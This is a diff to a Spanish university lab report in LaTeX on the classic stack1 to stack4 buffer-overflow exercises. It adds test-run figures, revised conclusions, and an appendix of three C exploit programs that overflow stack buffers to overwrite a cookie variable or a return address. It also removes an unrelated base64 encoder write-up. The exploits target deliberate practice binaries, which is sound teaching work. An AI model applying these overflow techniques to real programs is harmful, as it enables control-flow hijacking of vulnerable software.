@@ -96,9 +96,15 @@ Si añadimos un breakpoint justo en la linea anterior a la comprobación de la var
 
 \subsubsection{Corridas de prueba}
 
-AGREGAR IMAGEN DE LA CORRIDA
+\begin{figure}[h!]
+	\begin{center}
+		\includegraphics[width=1.0\textwidth]{1.eps}
+	\caption{Corrida de prueba del stack1}
+ 	\label{fig:corrida1}
+	\end{center}
+\end{figure}
 
-En la imagen se pueden observar ambas corridas de las mencionadas anteriormente, una utilizando el string ``xxxxxxx...xxxxDCBA'' y otra el ``xxxxxxx...xxxxABCD'' que comprueban que la correcta es la primera.
+En la en la Figura~\ref{fig:corrida1} se pueden observar ambas corridas de las mencionadas anteriormente, una utilizando el string ``xxxxxxx...xxxxDCBA'' y otra el ``xxxxxxx...xxxxABCD'' que comprueban que la correcta es la primera.
 
 \subsection{stack2.c}
 
@@ -121,9 +127,15 @@ Para lograr el objetivo en este caso no vamos a poder ingresar los caracteres po
 
 \subsubsection{Corridas de prueba}
 
-AGREGAR IMAGEN DE LA CORRIDA
+\begin{figure}[h!]
+	\begin{center}
+		\includegraphics[width=1.0\textwidth]{2.eps}
+	\caption{Corrida de prueba del stack2}
+ 	\label{fig:corrida2}
+	\end{center}
+\end{figure}
 
-En la imagen se puede observar que al ejecutar el exploit, este se encarga de ejecutar el programa stack2 con las entradas necesarias para lograr el mensaje de ``you win''.
+En la en la Figura~\ref{fig:corrida2} se puede observar que al ejecutar el exploit, este se encarga de ejecutar el programa stack2 con las entradas necesarias para lograr el mensaje de ``you win''.
 
 \subsection{stack3.c}
 
@@ -141,9 +153,15 @@ La forma en que plantearemos este stack va a ser igual al anterior, por lo que t
 
 \subsubsection{Corridas de prueba}
 
-AGREGAR IMAGEN DE LA CORRIDA
+\begin{figure}[h!]
+	\begin{center}
+		\includegraphics[width=1.0\textwidth]{3.eps}
+	\caption{Corrida de prueba del stack3}
+ 	\label{fig:corrida3}
+	\end{center}
+\end{figure}
 
-En la imagen se puede observar que al ejecutar el exploit, este se encarga de ejecutar el programa stack3 con las entradas necesarias para lograr el mensaje de ``you win''.
+En la en la Figura~\ref{fig:corrida3} se puede observar que al ejecutar el exploit, este se encarga de ejecutar el programa stack3 con las entradas necesarias para lograr el mensaje de ``you win!''.
 
 
 \subsection{stack4.c}
@@ -229,430 +247,21 @@ Una forma de conseguir que la dirección de retorno sea sobreescrita es llenando 
 
 \subsubsection{Corridas de prueba}
 
-AGREGAR IMAGEN DE LA CORRIDA
-
-En la imagen se puede observar que si bien el valor de la variable cookie no coincide con el esperado por el if, igualmente se ejecuta la instrucción del printf logrando el mensaje de ``you win!''.
-
-
-\subsection{Codificación}
-
-Para pasar de cualquier archivo a uno en base 64, es decir, codificar la información, utilizamos una funcion llamada b64 la cual recibe los siguientes parámetros: \\
-
-
-\textbf{"static int b64( char opt, char *infilename, char *outfilename, int linesize )"}
-
-\begin{itemize}
-    \item \textbf{opt:} indica si debe codificarse ('e') o decodificarse ('d') el archivo.
-    \item \textbf{infilename:} contiene el nombre del archivo origen que va a ser procesado.
-    \item \textbf{outfilename:} contiene el nombre del archivo destino donde se van a guardar los datos luego de realizar el codificado o decodificado.
-\end{itemize}
-
-Lo que realiza esta función básicamente es ir leyendo caracteres del archivo origen y guardandolos en un buffer múltiplo de 3 (el que usaremos va a ser exactamente de 3 chars es decir 24 bites) y cuando el buffer se encuentra lleno codificarlo a b64 dividiendolo en 4 elementos, cada uno de ellos de 6 bites.
-
-Esto hace que cualquier combinacion de unos y ceros vaya a parar a un elemento dentro de la tabla de caracteres permitidos por la codificación en base 64. Por último, estos nuevos caracteres codificados van a ser escritos en el nuevo archivo destino. 
-
-Cabe destacar que, en el caso de que se llegue al fin de archivo antes de llenar el buffer nuevamente, se procedera a completarlo con caracteres '=' para lograr que sea múltiplo de 3 y poder codificarlo. 
-
-Un aspecto interesante de la implementación es el codificado del buffer de 24 bits. Para ellos se van a utilizar variables del tipo char y operadores logicos para acomodar la posición de los bits significativos. Van a ocurrir tres posibilidades diferentes en este buffer:
-
-\begin{itemize}
-    \item \textbf{Primer elemento:} al obtener el primer elemento del buffer de caracteres obtendríamos 8 bits, de los cuales sólo nos interesan los 6 primeros. Por lo tanto al aplicar un desplazamiento lógico de dos lugares hacia la derecha de esa variable donde alojamos el caracter nos preveería el efecto deseado, ya que los dos bits mas significativos quedarían en cero, que es equivalente a darle importancia únicamente a los 6 bits restantes.
-       \item \textbf{Segundo elemento:} para poder conformar el segundo elemento del archivo codificado en base 64 necesitaríamos los 2 bits que no se utilizaron del primer char para el elemento anterior y 4 bits más correspondientes al segundo char del buffer. Para ello se va a realizar operaciones logicas de and y de desplazamiento. La forma en que opera el programa se puede observar en la Figura~\ref{fig:tabla1}  para no tener que explicar en palabras como se procesa cada elemento lo cual hace más dificil la comprensión.
-       
-\end{itemize}
-
 \begin{figure}[h!]
 	\begin{center}
-		\includegraphics[width=1.0\textwidth]{Tabla1.eps}
-	\caption{Codificación de elementos}
- 	\label{fig:tabla1}
+		\includegraphics[width=1.0\textwidth]{4.eps}
+	\caption{Corrida de prueba del stack4}
+ 	\label{fig:corrida4}
 	\end{center}
 \end{figure}
 
-\subsection{Deodificación}
+En la en la Figura~\ref{fig:corrida4} se puede observar que si bien el valor de la variable cookie no coincide con el esperado por el if, igualmente se ejecuta la instrucción del printf logrando el mensaje de ``you win!''.
 
-Para el decodificado, es decir, a partir de un archivo en base 64 transformalo a un archivo que acepte todos los caracteres de la tabla ASCII, se utiliza la misma función pero pasandole como parámetro el caracter 'd' en la opcion "opt".
-
-El procedimiento es similar al de la codificación pero ahora se utiliza un buffer con 4 elementos para decodificar, ya que para poder obtener 3 caracteres formados por 8 bits necesito 4 de 6 bits. Por lo que las operaciones para cada paso son las mostradas en la Figura~\ref{fig:tabla2}
-
-\begin{figure}[!htp]
-	\begin{center}
-		\includegraphics[width=1.0\textwidth]{Tabla2.eps}
-		\caption{Decodificación de elementos}
- 		\label{fig:tabla2}
-	\end{center}
-\end{figure}
 
 \section{Conclusiones}
 
-Dada la finalidad del trabajo práctico, que consistía en familiarizarse con las herramientas de software que usaremos en los siguientes trabajos, implementando un programa (y su correspondiente documentación) que resuelva el problema, podemos concluir que se logró dicho objetivo al aprender a utilizar herramientas que hasta el momento no manejabamos. 
-
-Por otra parte, por el lado del programa escrito en C propiamente hablando, la dificultad fue acorde al propósito mencionado anteriormente, ya que si bien nos llevó su tiempo pensarlo y realizarlo, no fue excesivo y nos permitió enfocarnos en le correcta utilización de las herramientas complementarías y la elaboración de un informe adaptándonos a las normas pedidas por el curso.
-
-\section{Código en C++}
-
-\subsection{Main.c}
-
-\begin{verbatim}
-
-#include <stdio.h>
-#include "base64.h"
-#include "constantes.h"
-#include "funciones.c"
-
-
-int main(int argc, char **argv){
-	
-   int iError = 0;
-   int iIndexARG = 0;
-   char cModo = ValidarArgumentos(argc,argv);
-   switch(cModo){
-         case MODO_DECODIFICADOR:
-            iIndexARG = 1;
-   		case MODO_CODIFICADOR:
-            iError = b64(cModo,argv[iIndexARG+2],argv[iIndexARG+4],B64_DEF_LINE_SIZE);
-   			if(iError==0){
-               puts(MSG_OK);
-            }else{
-               puts(b64_msgs[iError]);
-            }            
-   		break;
-   		case MODO_AYUDA:
-   			puts(MSG_HELP);
-   		break;
-   		case MODO_VERSION:
-   			puts(MSG_VERSION);
-   		break;
-   		default:
-   			puts("error");
-   		break;
-
-   }
-   return 0;
-}
-
-\end{verbatim}
-
-\subsection{Funciones.c}
-
-\begin{verbatim}
-
-#include <unistd.h>
-
-
-
-
-int ExisteArchivo(char* NombreArchivo){
-	int iReturn = -1;
-	if( access( NombreArchivo, F_OK ) != -1 ){
-    	iReturn = 0;
-	}
-	return iReturn;
-}
-
-
-
-/* 
-Esta funcion tiene como objetivo validar los parametros con las cuales se invoca el programa y determinar la respuesta adecuada
-del programa a la entrada.
-*/
-
-
-char ValidarArgumentos(int argc, char **argv){
-	
-	char cOutput = 'E';
-	DEBUG == 1 ? printf("argc es %d \n",argc) : printf("\n") ;
-
-	if(argc <  CONST_ARGC_MIN || argc > CONST_ARGC_MAX )
-	{
-	    puts(MSG_ERR_ARGS);
-	    puts(MSG_HELP);
-	}else{
-
-		if(strcmp(argv[1],CONST_ARG_HELP) == 0 ){
-			cOutput = MODO_AYUDA;
-		}else if(strcmp(argv[1],CONST_ARG_VERSION) == 0){
-			cOutput = MODO_VERSION;
-		}else{
-
-			if(strcmp(argv[1],CONST_ARG_DECODE) == 0) //Modo Decodificador
-			{
-				if(strcmp(argv[2],CONST_ARG_INPUT_NAME) == 0 && strcmp(argv[4],CONST_ARG_OUTPUT_NAME) == 0){
-					if(ExisteArchivo(argv[3]) == 0)
-					{
-						cOutput = MODO_DECODIFICADOR;	
-					}else{
-						puts(MSG_NO_FILE);
-					}
-				}else{
-				    puts(MSG_NO_ARGS);
-				    puts(MSG_HELP);
-				}
-
-			}else{ //Modo Codificador
-				if(strcmp(argv[1],CONST_ARG_INPUT_NAME) == 0 && strcmp(argv[3],CONST_ARG_OUTPUT_NAME) == 0){
-					if(ExisteArchivo(argv[2]) == 0)
-					{
-						cOutput = MODO_CODIFICADOR;
-					}else{
-						puts(MSG_NO_FILE);
-					}
-				}else{
-				    puts(MSG_NO_ARGS);
-				    puts(MSG_HELP);
-				}
-
-			}
-
-		}
-	}
-	return cOutput;
-}
-
-int ValidarArchivo(char* NombreArchivo){
-	int iReturn = -1;
-	if( access( NombreArchivo, F_OK ) != -1 ){
-    	iReturn = 0;
-	}
-	return iReturn;
-}
-
-\end{verbatim}
-
-\subsection{Base64.h}
-
-\begin{verbatim}
-
-#include <stdio.h>
-#include <stdlib.h>
-
-static const char cb64[]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-
-static const char cd64[]="|$$$}rstuvwxyz{$$$$$$$>?@ABCDEFGHIJKLMNOPQRSTUVW$$$$$$XYZ[\\]^_`abcdefghijklmnopq";
-
-
-
-#define B64_DEF_LINE_SIZE   72
-#define B64_MIN_LINE_SIZE    4
-#define B64_SYNTAX_ERROR        1
-#define B64_FILE_ERROR          2
-#define B64_FILE_IO_ERROR       3
-#define B64_ERROR_OUT_CLOSE     4
-#define B64_LINE_SIZE_TO_MIN    5
-#define B64_SYNTAX_TOOMANYARGS  6
-
-#define B64_MAX_MESSAGES 7
-static char *b64_msgs[ B64_MAX_MESSAGES ] = {
-            "b64:000:Invalid Message Code.",
-            "b64:001:Syntax Error -- check help (-h) for usage.",
-            "b64:002:File Error Opening/Creating Files.",
-            "b64:003:File I/O Error -- Note: output file not removed.",
-            "b64:004:Error on output file close.",
-            "b64:005:linesize set to minimum.",
-            "b64:006:Syntax: Too many arguments."
-};
-
-#define b64_message( ec ) ((ec > 0 && ec < B64_MAX_MESSAGES ) ? b64_msgs[ ec ] : b64_msgs[ 0 ])
-
-static void encodeblock( unsigned char *in, unsigned char *out, int len )
-{
-    out[0] = (unsigned char) cb64[ (int)(in[0] >> 2) ];
-    out[1] = (unsigned char) cb64[ (int)(((in[0] & 0x03) << 4) | ((in[1] & 0xf0) >> 4)) ];
-    out[2] = (unsigned char) (len > 1 ? cb64[ (int)(((in[1] & 0x0f) << 2) | ((in[2] & 0xc0) >> 6)) ] : '=');
-    out[3] = (unsigned char) (len > 2 ? cb64[ (int)(in[2] & 0x3f) ] : '=');
-}
-
-static int encode( FILE *infile, FILE *outfile, int linesize )
-{
-    unsigned char in[3];
-	unsigned char out[4];
-    int i, len, blocksout = 0;
-    int retcode = 0;
-
-	*in = (unsigned char) 0;
-	*out = (unsigned char) 0;
-    while( feof( infile ) == 0 ) {
-        len = 0;
-        for( i = 0; i < 3; i++ ) {
-            in[i] = (unsigned char) getc( infile );
-
-            if( feof( infile ) == 0 ) {
-                len++;
-            }
-            else {
-                in[i] = (unsigned char) 0;
-            }
-        }
-        if( len > 0 ) {
-            encodeblock( in, out, len );
-            for( i = 0; i < 4; i++ ) {
-                if( putc( (int)(out[i]), outfile ) == EOF ){
-	                if( ferror( outfile ) != 0 )      {
-	                    perror( b64_message( B64_FILE_IO_ERROR ) );
-	                    retcode = B64_FILE_IO_ERROR;
-	                }
-					break;
-				}
-            }
-            blocksout++;
-        }
-        if( blocksout >= (linesize/4) || feof( infile ) != 0 ) {
-            if( blocksout > 0 ) {
-                fprintf( outfile, "\n" );
-            }
-            blocksout = 0;
-        }
-    }
-    return( retcode );
-}
-
-static void decodeblock( unsigned char *in, unsigned char *out )
-{   
-    out[ 0 ] = (unsigned char ) (in[0] << 2 | in[1] >> 4);
-    out[ 1 ] = (unsigned char ) (in[1] << 4 | in[2] >> 2);
-    out[ 2 ] = (unsigned char ) (((in[2] << 6) & 0xc0) | in[3]);
-}
-
-static int decode( FILE *infile, FILE *outfile )
-{
-	int retcode = 0;
-    unsigned char in[4];
-    unsigned char out[3];
-    int v;
-    int i, len;
-
-	*in = (unsigned char) 0;
-	*out = (unsigned char) 0;
-    while( feof( infile ) == 0 ) {
-        for( len = 0, i = 0; i < 4 && feof( infile ) == 0; i++ ) {
-            v = 0;
-            while( feof( infile ) == 0 && v == 0 ) {
-                v = getc( infile );
-                if( feof( infile ) == 0 ) {
-	                v = ((v < 43 || v > 122) ? 0 : (int) cd64[ v - 43 ]);
-					if( v != 0 ) {
-						v = ((v == (int)'$') ? 0 : v - 61);
-					}
-                }
-            }
-            if( feof( infile ) == 0 ) {
-                len++;
-                if( v != 0 ) {
-                    in[ i ] = (unsigned char) (v - 1);
-                }
-            }
-            else {
-                in[i] = (unsigned char) 0;
-            }
-        }
-        if( len > 0 ) {
-            decodeblock( in, out );
-            for( i = 0; i < len - 1; i++ ) {
-                if( putc( (int) out[i], outfile ) == EOF ){
-	                if( ferror( outfile ) != 0 )      {
-	                    perror( b64_message( B64_FILE_IO_ERROR ) );
-	                    retcode = B64_FILE_IO_ERROR;
-	                }
-					break;
-				}
-            }
-        }
-    }
-    return( retcode );
-}
-
-static int b64( char opt, char *infilename, char *outfilename, int linesize )
-{
-    FILE *infile;
-    int retcode = B64_FILE_ERROR;
-
-    if( !infilename ) {
-        infile = stdin;
-    }
-    else {
-        infile = fopen( infilename, "rb" );
-    }
-    if( !infile ) {
-        perror( infilename );
-    }
-    else {
-        FILE *outfile;
-        if( !outfilename ) {
-            outfile = stdout;
-        }
-        else {
-            outfile = fopen( outfilename, "wb" );
-        }
-        if( !outfile ) {
-            perror( outfilename );
-        }
-        else {
-            if( opt == 'e' ) {
-                retcode = encode( infile, outfile, linesize );
-            }
-            else {
-                retcode = decode( infile, outfile );
-            }
-			if( retcode == 0 ) {
-	            if (ferror( infile ) != 0 || ferror( outfile ) != 0) {
-                    perror( b64_message( B64_FILE_IO_ERROR ) );
-	                retcode = B64_FILE_IO_ERROR;
-	            }
-            }
-            if( outfile != stdout ) {
-                if( fclose( outfile ) != 0 ) {
-                    perror( b64_message( B64_ERROR_OUT_CLOSE ) );
-                    retcode = B64_FILE_IO_ERROR;
-                }
-            }
-        }
-        if( infile != stdin ) {
-			if( fclose( infile ) != 0 ) {
-				perror( b64_message( B64_ERROR_OUT_CLOSE ) );
-				retcode = B64_FILE_IO_ERROR;
-			}
-        }
-    }
-
-    return( retcode );
-}
-\end{verbatim}
-
-\subsection{Constantes.h}
-
-\begin{verbatim}
-
-//Flags
-#define DEBUG 0
-
-
-//Constantes
-#define CONST_ARGC_MIN 2
-#define CONST_ARGC_MAX 6
-#define CONST_ERR_MSG 600
-
-#define CONST_ARG_HELP "-h"
-#define CONST_ARG_VERSION "-V"
-#define CONST_ARG_DECODE "-d"
-#define CONST_ARG_OUTPUT_NAME "-o"
-#define CONST_ARG_INPUT_NAME "-i"
-
-
-//Mensajes
-#define MSG_VERSION "Version 1.0 \n"
-#define MSG_NO_ARGS "El programa ha sido invocado sin argumentos.\n"
-#define MSG_NO_FILE "El nombre del archivo a convertir es inexistente.\n"
-#define MSG_ERR_ARGS "Los argumentos no han sido llamados de forma correcta.\n"
-#define MSG_HELP  "La invocacion debe ser de la forma: [-d] -i NOMBRE_ARCHIVO_ORIGEN  -o NOMBRE_ARCHIVO_SALIDA\n   \t-h\tVer Ayuda\n\t-V\tVersion Actual\n\t-d\tModo Decodificador\n \t-i\tNombre archivo de entrada\n\t-o\tNombre archivo de salida\n\n" 
-#define MSG_OK "Operacion Completada con Exito\n"
-//Modos
-#define MODO_CODIFICADOR 'e'
-#define MODO_DECODIFICADOR 'd'
-#define MODO_AYUDA 'h'
-#define MODO_VERSION 'V'
-
-\end{verbatim}
-
+A partir de la realización de este trabajo práctico logramos comprender mejor el concepto de ABI (Interfaz Binaria de Aplicación) y la forma en que se programa en assembly. A partir de estos conceptos fue que logramos llevar adelante el trabajo y encontramos las vulnerabilidades de los enunciados propuestos. Además, fue de gran ayuda para terminar de adquirir los conocimientos que fueron explicados en clase durante las últimas semanas y de comprender la forma en que se comunican los módulos dentro de un programa o mismo el sistema operativo con ellos.
+Las herramientas brindadas y recomendadas por la cátedra fueron de gran ayuda a la hora de comprender los problemas, ya que, por ejemplo GDB, nos brindaba información acerca del estado de las variables y los registros a lo largo de la ejecución del programa.
 
 \section{Bibliografía y Recursos utilizados}
 
@@ -663,6 +272,186 @@ static int b64( char opt, char *infilename, char *outfilename, int linesize )
  \item http://www.bluesock.org/~willg/dev/ascii.html
 \end{enumerate}
 
+\section{Anexo: Código en C}
 
+\subsection{stack2-exploit.c}
+
+\begin{verbatim}
+
+#include <stdio.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+
+main()
+{
+
+	char buf[80+4+1]; // 80 bytes del buffer, 4 de la variable "cookie" 
+					 //y 1 adicional para el '\0'
+	int pipes[2];
+	pid_t pidchild;
+
+	//bytes de relleno
+	memset((void *)buf,'a',80);
+
+	//metemeos el contenido de cookie
+	buf[80]=0x05;
+	buf[81]=0x03;
+	buf[82]=0x02;
+	buf[83]=0x01;
+	buf[84]='\n';
+	pipe(pipes);
+	fprintf(stderr,"Buscando vulnerabilidades\n");
+	if( !(pidchild=fork()) ){ //devuelve el PID del proc hijo
+
+		//cerramos la salida de la pipe, porque de aquí sólo queremos leer
+		close(pipes[1]);
+		//todo lo que entre en pipe, lo queremos poner al stdin (0)
+		dup2(pipes[0],0);
+		//cerramos el pipe de entrada, porque ya lo hemos copiado
+		close(pipes[0]);
+
+		execl("./stack2",NULL);
+	}
+
+	//cerramos la entrada de la pipe, porque de aqui solo queremos escribir
+	close(pipes[0]);
+	//todo lo que escribamos en stdout, lo escribiremos en la pipe de escritura
+	dup2(pipes[1],1);
+	//cerramos la pipe de escritura, ya que ahora se hace referencia a ella por stdout
+	close(pipes[1]);
+
+	//escribimos en nuestro stdout, que hace referencia a pipe[1],
+	//la cual esta conectada con pipe[0], que corresponde al stdin
+	//del proceso hijo
+	write(1,buf,strlen(buf));
+
+	waitpid(pidchild,0,0); //esperamos a que termine el hijo
+	exit(0);
+
+}
+
+\end{verbatim}
+
+
+\subsection{stack3-exploit.c}
+
+\begin{verbatim}
+
+#include <stdio.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+
+main()
+{
+
+	char buf[80+4+1]; // 80 bytes del buffer, 4 de la variable "cookie" 
+			 //y 1 adicional para el '\0'
+	int pipes[2];
+	pid_t pidchild;
+
+	//bytes de relleno
+	memset((void *)buf,'a',80);
+
+	//metemeos el contenido de cookie
+	buf[80]=0x05;
+	buf[81]=0x00;
+	buf[82]=0x02;
+	buf[83]=0x01;
+	buf[84]='\n';
+	pipe(pipes);
+	fprintf(stderr,"Buscando vulnerabilidades\n");
+	if( !(pidchild=fork()) ){ //devuelve el PID del proc hijo
+
+		//cerramos la salida de la pipe, porque de aquí sólo queremos leer
+		close(pipes[1]);
+		//todo lo que entre en pipe, lo queremos poner al stdin (0)
+		dup2(pipes[0],0);
+		//cerramos el pipe de entrada, porque ya lo hemos copiado
+		close(pipes[0]);
+
+		execl("./stack3",NULL);
+	}
+
+	//cerramos la entrada de la pipe, porque de aqui solo queremos escribir
+	close(pipes[0]);
+	//todo lo que escribamos en stdout, lo escribiremos en la pipe de escritura
+	dup2(pipes[1],1);
+	//cerramos la pipe de escritura, ya que ahora se hace referencia a ella por stdout
+	close(pipes[1]);
+
+	//escribimos en nuestro stdout, que hace referencia a pipe[1],
+	//la cual esta conectada con pipe[0], que corresponde al stdin
+	//del proceso hijo
+	write(1,buf,sizeof(buf));
+
+	waitpid(pidchild,0,0); //esperamos a que termine el hijo
+	exit(0);
+
+}
+
+\end{verbatim}
+
+\subsection{stack4-exploit.c}
+
+\begin{verbatim}
+
+#include <stdio.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+
+main()
+{
+
+	char buf[1024];
+	int pipes[2];
+	pid_t pidchild;
+	int i;	
+
+	for(i=0;i<200;i+=4) {
+      	   buf[i+3]='\x00';
+	   buf[i+2]='\x40';
+           buf[i+1]='\x0c';
+           buf[i]='\x40';
+	}
+	buf[i]='\n'; //Para que "gets" tome la cadena
+
+	pipe(pipes);
+	fprintf(stderr,"Buscando vulnerabilidades\n");
+	if( !(pidchild=fork()) ){ //devuelve el PID del proc hijo
+
+		//cerramos la salida de la pipe, porque de aquí sólo queremos leer
+		close(pipes[1]);
+		//todo lo que entre en pipe, lo queremos poner al stdin (0)
+		dup2(pipes[0],0);
+		//cerramos el pipe de entrada, porque ya lo hemos copiado
+		close(pipes[0]);
+
+		execl("./stack4",NULL);
+	}
+
+	//cerramos la entrada de la pipe, porque de aqui solo queremos escribir
+	close(pipes[0]);
+	//todo lo que escribamos en stdout, lo escribiremos en la pipe de escritura
+	dup2(pipes[1],1);
+	//cerramos la pipe de escritura, ya que ahora se hace referencia a ella por stdout
+	close(pipes[1]);
+
+	//escribimos en nuestro stdout, que hace referencia a pipe[1],
+	//la cual esta conectada con pipe[0], que corresponde al stdin
+	//del proceso hijo
+	write(1,buf,sizeof(buf));
+
+	waitpid(pidchild,0,0); //esperamos a que termine el hijo
+	exit(0);
+
+}
+
+\end{verbatim}
 
 \end{document}
